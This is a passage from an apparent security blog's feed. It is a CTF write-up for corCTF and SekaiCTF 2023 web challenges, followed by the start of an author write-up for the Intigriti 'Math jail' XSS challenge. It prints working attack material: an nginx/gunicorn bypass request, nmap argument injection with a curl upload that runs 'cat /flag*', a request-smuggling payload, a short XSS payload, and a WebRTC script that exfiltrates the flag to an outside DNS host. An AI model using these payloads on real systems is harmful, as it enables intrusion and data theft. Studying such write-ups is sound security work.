class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>After the competition, I saw two other interesting solutions. One of them leaks the information by loading fonts. When you do this:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token atrule"><span class="token rule">@font-face</span></span> <span class="token punctuation">&#123;</span>    <span class="token property">font-family</span><span class="token punctuation">:</span> a<span class="token punctuation">;</span>    <span class="token property">src</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/time-before<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/search.php?query=corctf&#123;a<span class="token punctuation">)</span></span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/search.php?query=corctf&#123;a<span class="token punctuation">)</span></span><span class="token punctuation">,</span>... <span class="token comment">/*10000 times */</span><span class="token punctuation">,</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>/time-after<span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Chrome determines how to handle it based on the status code. If it is 200, it checks if it is a valid font. If it is 404, it fails directly. Therefore, you can use the loading time of the font to determine the status code.</p><p>ref: <a href="https://gist.github.com/parrot409/09688d0bb81acbe8cd1a10cfdaa59e45">https://gist.github.com/parrot409/09688d0bb81acbe8cd1a10cfdaa59e45</a></p><p>The other solution also utilizes the feature of whether the CSS file is loaded, but instead of using cache, it causes server-side busyness by opening a large number of pages at once and slows down the response time to determine.</p><p>ref: <a href="https://gist.github.com/arkark/3afdc92d959dfc11c674db5a00d94c09">https://gist.github.com/arkark/3afdc92d959dfc11c674db5a00d94c09</a></p><h3><span id="pdf-pal-2-solves">pdf-pal (2 solves)</span></h3><p>The nginx config for this challenge looks like this:</p><pre class="line-numbers language-none"><code class="language-none">location &#x2F; &#123;    proxy_pass http:&#x2F;&#x2F;localhost:7777;    location ^~ &#x2F;generate &#123;        allow 127.0.0.1;        deny all;    &#125;    location ^~ &#x2F;rename &#123;        allow 127.0.0.1;        deny all;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>So, theoretically, accessing the <code>/generate</code> path should not be possible. However, you can bypass it by exploiting the difference between gunicorn and nginx parsers:</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;generate&#123;chr(9)&#125;HTTP&#x2F;1.1&#x2F;..&#x2F;..&#x2F; HTTP&#x2F;1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Related ticket: <a href="https://github.com/benoitc/gunicorn/issues/2530">https://github.com/benoitc/gunicorn/issues/2530</a></p><p>After bypassing, you can use the <code>/generate</code> function to generate a PDF. However, because this service blocks some keywords, it is not possible to directly convert the flag into a PDF.</p><p>The solution is to use DNS rebinding to POST to <code>http://localhost:7778</code> and retrieve the response.</p><p>For example, if we have a domain <code>example.com</code> with two A records, one pointing to the actual IP and the other pointing to 0.0.0.0, when the admin bot visits <code>http://example.com:7778/</code>, it resolves the actual IP and successfully retrieves the page.</p><p>At this point, we shut down the server and execute <code>fetch(&#39;http://example.com:7778/generate&#39;)</code>. Since the original IP is no longer accessible, the browser will fallback to 0.0.0.0 and successfully send the request to the desired location. Because it is same-origin, we can also retrieve the response.</p><p>For more details, please refer to:</p><ol><li><a href="https://github.com/nccgroup/singularity">https://github.com/nccgroup/singularity</a></li><li><a href="https://larry.sh/post/corctf-2021/#:~:text=receive%20the%20flag.-,saasme,-(2%20solves)">https://larry.sh/post/corctf-2021/#:~:text=receive%20the%20flag.-,saasme,-(2%20solves)</a></li></ol><h3><span id="lemon-csp-1-solve">lemon-csp (1 solve)</span></h3><p>Found a CSP bypass for 0-day, no public solution available.</p><h3><span id="0day-1-solve">0day (1 solve)</span></h3><p>This challenge involves finding a 1-day for VM2, no public solution available.</p><h2><span id="sekaictf-2023">SekaiCTF 2023</span></h2><p>The source code for the challenges is available here: <a href="https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web">https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web</a></p><h3><span id="scanner-service-146-solves">Scanner Service (146 solves)</span></h3><p>Input the port and host, and the following code will be executed:</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">nmap <span class="token operator">-</span>p <span class="token comment">#&#123;port&#125; #&#123;hostname&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>However, the input data goes through a sanitizer with character restrictions.</p><p>Tabs can be used, so you can use tabs to add parameters. During the competition, <code>-iL /flag.txt -oN -</code> was used to pass the challenge, redirecting the output to stdout, or using <code>/dev/stdout</code> is also valid.</p><p>The official writeup suggests using the <code>http-fetch</code> script to download the file to the local machine, and then running <code>nmap --script</code> to execute that script:</p><pre class="line-numbers language-none"><code class="language-none">--script http-fetch -Pn --script-args http-fetch.destination&#x3D;&#123;DOWNLOAD_DIR&#125;,http-fetch.url&#x3D;&#123;NSE_SCRIPT&#125;--script&#x3D;&#123;DOWNLOAD_DIR&#125;&#x2F;&#123;LHOST&#125;&#x2F;&#123;LPORT&#125;&#x2F;&#123;NSE_SCRIPT&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>In Discord, @zeosutt provided an interesting alternative solution that utilizes the technique of uploaded files being stored in <code>/tmp/</code> on the rack server. You can directly import the uploaded file:</p><pre class="line-numbers language-none"><code class="language-none">curl http:&#x2F;&#x2F;35.231.135.130:32190&#x2F; -F $&#39;service&#x3D;127.0.0.1:1337\t--script\t&#x2F;tmp&#x2F;RackMultipart?????????????????&#39; -F &#39;&#x3D;os.execute(&quot;cat &#x2F;flag*&quot;);filename&#x3D;evil&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3><span id="frog-waf-29-solves">Frog-WAF (29 solves)</span></h3><p>There is an EL injection vulnerability in <code>buildConstraintViolationWithTemplate</code>, and the remaining challenge is to bypass the WAF.</p><p>Similar vulnerabilities have been found in actual products:</p><ol><li><a href="https://github.com/advisories/GHSA-wfj5-2mqr-7jvv">Expression Language Injection in Netflix Conductor</a></li><li><a href="https://xz.aliyun.com/t/7889">CVE-2020-9296-Netflix-Conductor-RCE-Analysis</a></li></ol><p>For the bypassing part, you can refer to the following resources:</p><ol><li><a href="https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py">https://github.com/project-sekai-ctf/sekaictf-2023/blob/main/web/frog-waf/solution/solve.py</a></li><li><a href="https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba">https://gist.github.com/maikypedia/db98bc83cc76ec7c82e1a4347c6127ba</a></li><li><a href="https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00">https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00</a></li></ol><h3><span id="chunky-16-solves">Chunky (16 solves)</span></h3><p>This challenge involves a cache server and a backend server. All requests go through the cache server before reaching the backend, and a copy of the response is stored in the cache server as a cache. The goal is to poison the cache.</p><p>The solution is to construct a request that is interpreted differently by the cache server and the backend server, similar to request smuggling. Here is the solution provided by <a href="https://gist.github.com/zeyu2001/1b9e9634f6ec6cd3dcb588180c79bf00">zeyu</a>:</p><pre class="line-numbers language-none"><code class="language-none">GET &#x2F;aaaaa HTTP&#x2F;1.1Host: localhosttransfer-encoding: chunkedContent-Length: 1020GET &#x2F;post&#x2F;56e02543-8616-4536-9062-f18a4a466a03&#x2F;e85a6915-0fe6-4ca6-a5e7-862d00bca6e5 HTTP&#x2F;1.1X: GET &#x2F;56e02543-8616-4536-9062-f18a4a466a03&#x2F;.well-known&#x2F;jwks.json HTTP&#x2F;1.1Host: localhost<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The cache server interprets the second request as <code>GET /56e02543-8616-4536-9062-f18a4a466a03/.well-known/jwks.json</code> based on the <code>Content-Length</code> header, while the backend server interprets it as <code>GET /post/56e02543-8616-4536-9062-f18a4a466a03/e85a6915-0fe6-4ca6-a5e7-862d00bca6e5</code> based on the <code>transfer-encoding</code> header. This way, we can use the response from another path to poison the jwks.json file and achieve cache poisoning.</p><h3><span id="golf-jail-16-solves">Golf Jail (16 solves)</span></h3><p>I have solved this challenge, which took me about a day. I found it very interesting, and the code is concise.</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Cross-Origin-Opener-Policy: same-origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"🚩🚩🚩"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"xss"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SEKAI&#123;test_flag&#125;"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span>            <span class="token attr-name">sandbox</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>allow-scripts<span class="token punctuation">"</span></span>            <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;!-- <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span> <span class="token delimiter important">?></span></span> -->&lt;div><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>&lt;/div><span class="token punctuation">"</span></span>        <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>You are given a 30-character free XSS payload, and the goal is to execute arbitrary code.</p><p>The clever part here is the use of <code>&lt;iframe srcdoc&gt;</code> with <code>sandbox=allow-scripts</code> to create an environment where code can be executed, but the origin is <code>null</code>, and the CSP (Content Security Policy) inherits the execution environment from the parent.</p><p>Therefore, you cannot access any information from the top, including <code>name</code> or <code>location</code>.</p><p>After searching around, I found <code>baseURI</code> in the <code>document</code>, which I discovered inherits the value from the parent and contains the complete path. So, by using <code>&lt;svg/onload=eval(&quot;&#39;&quot;+baseURI)&gt;</code> along with a hash, we can execute arbitrary code within the 30-character limit.</p><p>The reason we can use <code>baseURI</code> to access <code>document.baseURI</code> is that the scope of inline event handlers is automatically added to the document. I wrote about this in my blog post <a href="https://blog.huli.tw/2021/10/25/en/learn-frontend-from-security-pov/">Discovering My Lack of Front-end Knowledge through Cybersecurity</a>.</p><p>Once we have XSS, we can use <code>document.childNodes[0].nodeValue</code> to retrieve the flag. The final challenge is how to exfiltrate the flag. The CSP in this challenge is strict, and we cannot use redirects or <code>window.open</code> (the challenge blocks navigation without using the new <code>navigate-to</code> directive, it’s impressive). So, we have to rely on some existing bypass techniques.</p><p>I first tried DNS prefetch, but it didn’t work. I found out that Chrome released a feature called <a href="https://chromestatus.com/feature/5553640629075968">Resoure Hint “Least Restrictive” CSP</a> in version 112, which might be the reason.</p><p>But no worries, WebRTC is still useful. However, I couldn’t figure out how to use it even after trying for a long time. In the end, I found a payload in another team’s write-up on <a href="https://ctftime.org/writeup/37702">CTFtime</a> and combined it with DNS:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> flag <span class="token operator">=</span> document<span class="token punctuation">.</span>childNodes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>nodeValue<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"SEKAI&#123;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">c</span> <span class="token operator">=></span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RTCPeerConnection</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">iceServers</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">urls</span><span class="token operator">:</span> <span class="token string">"stun:"</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">".29e6037fd1.ipv6.1433.eu.org:1337"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">createDataChannel</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">setLocalDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="leakless-note-4-solves">Leakless Note (4 solves)</span></h3><p>This is an advanced version of the previously mentioned “leakynote” challenge. This time, the CSP is stricter with the addition of <code>default-src &#39;self&#39;</code>, and there are no other CSS files on the page.</p><p>The scenario is the same: there is an iframe that may or may not load, and the goal is to detect this.</p><p>The solution provided by strellic is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// leakless note oracle</span><span class="token keyword">const</span> <span class="token function-variable function">oracle</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">w<span class="token punctuation">,</span> href</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> runs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> samples <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">600</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token number">1e6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">const</span> t <span class="token operator">=</span> performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            w<span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>b<span class="token punctuation">.</span>buffer<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            samples<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>performance<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> t<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">delete</span> b<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        runs<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>samples<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token operator">=></span>a<span class="token operator">+</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        w<span class="token punctuation">.</span>location <span class="token operator">=</span> href<span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rate limit</span>        <span class="token keyword">await</span> <span class="token function">waitFor</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    runs<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">median</span><span class="token operator">:</span> <span class="token function">median</span><span class="token punctuation">(</span>runs<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token literal-property property">sum</span><span class="token operator">:</span> runs<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token operator">=></span>a<span class="token operator">+</span>b<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        runs    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>When you send a large message to the iframe, the time it takes will be different.</p><p>Another team opened 1000 tabs and measured the network time. In hindsight, it seems quite reasonable. If the iframe has a status code of 200, it will generate a lot of requests, slowing down the network speed.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;I participated in both of these events to some extent, but I didn’t look at every challenge. This post is just a note to briefly record the solutions, without going into too much detail.&lt;/p&gt;
&lt;p&gt;As usual, here are the keywords I noted:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;GraphQL batch query + alias&lt;/li&gt;
&lt;li&gt;Python os.path.join absolute path&lt;/li&gt;
&lt;li&gt;Svg XSS, foreignObject&lt;/li&gt;
&lt;li&gt;WebRTC CSP bypass&lt;/li&gt;
&lt;li&gt;Status code xsleak&lt;/li&gt;
&lt;li&gt;DNS rebinding&lt;/li&gt;
&lt;li&gt;nmap command injection&lt;/li&gt;
&lt;li&gt;Ruby rack file upload temporary storage&lt;/li&gt;
&lt;li&gt;buildConstraintViolationWithTemplate EL injection&lt;/li&gt;
&lt;li&gt;Request smuggling&lt;/li&gt;
&lt;li&gt;document.baseURI&lt;/li&gt;
&lt;li&gt;200&amp;#x2F;404 status code xsleak&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Math jail - Intigriti 0823 XSS Challenge Author Writeup</title>
    <link href="https://blog.huli.tw/2023/08/29/en/intigriti-0823-author-writeup/"/>
    <id>https://blog.huli.tw/2023/08/29/en/intigriti-0823-author-writeup/</id>
    <published>2023-08-29T06:10:44.000Z</published>
    <updated>2023-08-29T06:41:36.526Z</updated>
    
    <content type="html"><![CDATA[<p>In the monthly challenges at Intigriti, I presented an XSS challenge that I named “Math Jail.” You can find the challenge at the following link: <a href="https://challenge-0823.intigriti.io/">https://challenge-0823.intigriti.io/</a></p><p>Now that the challenge has concluded, I’d like to take this opportunity to discuss the thought process behind creating the challenge and share some of the solutions that were developed.</p><span id="more"></span><p>The concept of “Math jail” originated from a challenge called “Culinary Class Room” in the Hack.lu CTF 2022. This challenge required adding numerous decorators to a Python class without any parameters, with the objective of executing arbitrary code.</p><p>Decorators are essentially function calls, which means you can only use code in the form of <code>a(b(c(d(e(f())))))</code>. How can one achieve the ability to execute any desired functionality?</p><p>Similar challenges have also appeared in Chinese CTF competitions, such as the one mentioned in this article: <a href="https://xz.aliyun.com/t/9360">PHP Parameterless RCE</a>.</p><p>The solution to the Culinary Class Room challenge involved finding a list, pushing multiple numbers into it, converting it to bytes, and then passing it to <code>eval()</code> for execution.</p><p>For example, the following code snippet would push the number 112 into <code>copyright._Printer__filenames</code>:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@copyright<span class="token punctuation">.</span>_Printer__filenames<span class="token punctuation">.</span>append</span><span class="token decorator annotation punctuation">@memoryview<span class="token punctuation">.</span>__basicsize__<span class="token punctuation">.</span>__sub__</span><span class="token decorator annotation punctuation">@staticmethod<span class="token punctuation">.</span>__basicsize__<span class="token punctuation">.</span>__mul__</span><span class="token decorator annotation punctuation">@object<span class="token punctuation">.</span>__instancecheck__</span><span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">:</span><span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Upon encountering this challenge, I wondered if it would be possible to create a JavaScript version. That’s how Math jail came into existence.</p><p>Initially, there was no requirement for it to start with <code>Math.</code>, but later on, I found it more interesting to do so. Moreover, if it didn’t have this restriction, one could simply execute <code>alert(document.domain.toString())</code> and be done. Filtering out many keywords and potential unintended consequences would be necessary.</p><p>Now, let’s discuss the general approach to solving Math jail.</p><h2><span id="the-overall-concept-of-the-solution">The overall concept of the solution</span></h2><p>The concept is similar to the Python version mentioned earlier. We need to find a list, push elements into it, and then join the elements and pass them to <code>eval()</code> for execution. Here’s a general example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">eval</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// Uncaught ReferenceError: a is not defined</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>In the above code, the variable <code>a</code> is executed. By following this concept, we can construct <code>alert()</code>. Let’s take a simple example:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">]</span><span class="token function">eval</span><span class="token punctuation">(</span>  arr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>    <span class="token string">''</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>        arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>          <span class="token string">')'</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>            arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>              <span class="token string">'('</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>                arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'t'</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token punctuation">)</span>            <span class="token punctuation">)</span>          <span class="token punctuation">)</span>        <span class="token punctuation">)</span>      <span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Since each function call cannot have parameters, expressions like <code>arr.join(&#39;&#39;)</code> can be modified to <code>arr.join(&#39;&#39;.toString())</code> to comply with the rule.</p><p>Once we have this basic concept, the remaining questions can be divided into four parts:</p><ol><li>How do we find a usable array?</li><li>How do we find the desired characters?</li><li>How do we join them?</li><li>How do we execute without using eval?</li></ol><h2><span id="1-finding-an-array">1. Finding an array</span></h2><p>In the given challenge, there is a specific array called <code>Math.seeds</code>. By using the <code>pop()</code> method multiple times, we can empty the array. Here’s an example:</p><pre 